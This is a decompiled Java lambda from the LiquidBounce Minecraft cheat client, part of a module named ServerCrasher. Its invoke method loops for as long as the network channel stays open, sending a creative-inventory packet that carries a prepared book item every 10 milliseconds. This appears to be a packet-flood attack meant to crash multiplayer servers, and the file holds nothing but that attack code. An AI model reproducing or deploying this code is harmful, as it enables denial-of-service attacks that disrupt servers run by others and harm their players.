package net.ccbluex.liquidbounce.features.module.modules.exploit;

import kotlin.Metadata;
import kotlin.Unit;
import kotlin.jvm.functions.Function0;
import kotlin.jvm.internal.Lambda;
import net.ccbluex.liquidbounce.api.minecraft.INetworkManager;
import net.ccbluex.liquidbounce.api.minecraft.item.IItemStack;
import net.ccbluex.liquidbounce.injection.backend.NetworkManagerImpl;
import net.ccbluex.liquidbounce.utils.MinecraftInstance;

@Metadata(mv={1, 1, 16}, bv={1, 0, 3}, k=3, d1={"\u0000\b\n\u0000\n\n\u0000\u00000H\nÂ¢\b"}, d2={"<anonymous>", "", "invoke"})
final class ServerCrasher$onEnable$1
extends Lambda
implements Function0<Unit> {
    final IItemStack $book4;

    @Override
    public final void invoke() {
        while (true) {
            INetworkManager $this$unwrap$iv = MinecraftInstance.mc.getNetHandler().getNetworkManager();
            boolean $i$f$unwrap = false;
            if (!((NetworkManagerImpl)$this$unwrap$iv).getWrapped().isChannelOpen()) break;
            MinecraftInstance.mc.getNetHandler().addToSendQueue(MinecraftInstance.classProvider.createCPacketCreativeInventoryAction(100, this.$book4));
            try {
                Thread.sleep(10L);
            }
            catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }

    ServerCrasher$onEnable$1(IItemStack iItemStack) {
        this.$book4 = iItemStack;
        super(0);
    }
}
